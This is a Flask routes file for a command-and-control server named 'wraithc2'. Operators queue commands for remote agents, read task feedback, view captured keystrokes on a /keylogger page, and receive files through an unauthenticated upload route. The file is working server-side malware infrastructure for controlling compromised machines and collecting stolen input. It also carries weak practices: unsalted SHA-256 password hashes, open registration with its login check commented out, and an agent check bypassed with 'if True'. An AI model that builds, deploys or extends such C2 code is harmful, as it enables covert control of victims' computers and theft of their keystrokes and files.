from flask import send_from_directory, request, redirect, url_for, render_template, flash
from wraithc2 import app, db
from wraithc2.forms import SignInForm, RegisterForm, TaskForm, StatusForm
from wraithc2.models import User, Tasks, Keys
import hashlib
from flask_login import login_user, current_user, logout_user, login_required
from datetime import datetime
from werkzeug.utils import secure_filename
import os


ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}



def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/uploads', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect('No selected file')
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)

            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return {'success': 'file uploaded successfully'}
    if request.method == 'GET':
        files = [file for file in os.listdir(app.config["UPLOAD_FOLDER"])]
        return render_template("searchreturn.html", list=files)







@app.route("/", methods=['GET', 'POST'])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('wraithc2'))
    form = SignInForm()
    if form.validate_on_submit():
        user = User.query.filter_by(username=form.username.data).first()
        if user:
            password = hashlib.sha256((form.password.data).encode('utf-8')).hexdigest()
            if user.password == password:
                login_user(user)
                return redirect(url_for('wraithc2'))
        else:
            flash('Incorrect Username or Password')
    return render_template("login.html", form=form)





@app.route("/wraithc2", methods=['GET', 'POST'])
@login_required
def wraithc2():
    form = TaskForm()
    if form.validate_on_submit():
        agent = Tasks.query.filter_by(agent=form.agent.data).first()
        if True: #if agent:
            task = Tasks(time=datetime.utcnow(), command=(str(form.command.data) + " " + str(form.parameters.data)), agent=form.agent.data, author=current_user.username)
            db.session.add(task)
            db.session.commit()
            flash('Task added successfully')
        else:
            flash('Invalid agent', 'error')
    allTasks = [str(task.feedback) for task in Tasks.query.all()]
    allTasks.reverse()
    recentTasks = []
    for i in range(0,5):
        if i < len(allTasks):
            recentTasks.append(allTasks[i])


    if recentTasks:
       return render_template("wraithc2.html", form=form, recentTasks=recentTasks)
    else:
        return render_template("wraithc2.html", form=form)


@app.route("/keylogger", methods=['GET'])
@login_required
def keylogger():
    keylist = [str(key) for key in Keys.query.all()]
    keylist.reverse()
    return render_template("searchreturn.html", list=keylist)

@app.route("/status", methods=['GET', 'POST'])
@login_required
def status():
    form = StatusForm()
    if form.validate_on_submit():
        if form.result.data == "PENDING" or form.result.data == "SUCCESS":
            agent = Tasks.query.filter_by(agent=form.agent.data).filter_by(result=form.result.data).first()
        else:
            agent = Tasks.query.filter_by(agent=form.agent.data).first()
        if agent:
            tasklist = [str(task) for task in Tasks.query.filter_by(agent=form.agent.data).all()]
            tasklist.reverse()
            return render_template("searchreturn.html", list=tasklist)
        else:
            tasklist = [str(task) for task in Tasks.query.all()]
            tasklist.reverse()
            return render_template("searchreturn.html", list=tasklist)
    return render_template("search.html", form=form)




@app.route("/register", methods=['GET', 'POST'])
#@login_required
def register():
    form = RegisterForm()
    if form.validate_on_submit():
        hashed_password = hashlib.sha256((form.password.data).encode('utf-8')).hexdigest()
        user = User(username=form.username.data, password=hashed_password)
        db.session.add(user)
        db.session.commit()  # add user to the database
        return redirect(url_for('login'))
    return render_template("register.html", form=form)



@app.route("/logout")
def logout():
    logout_user()
    return redirect(url_for('login'))

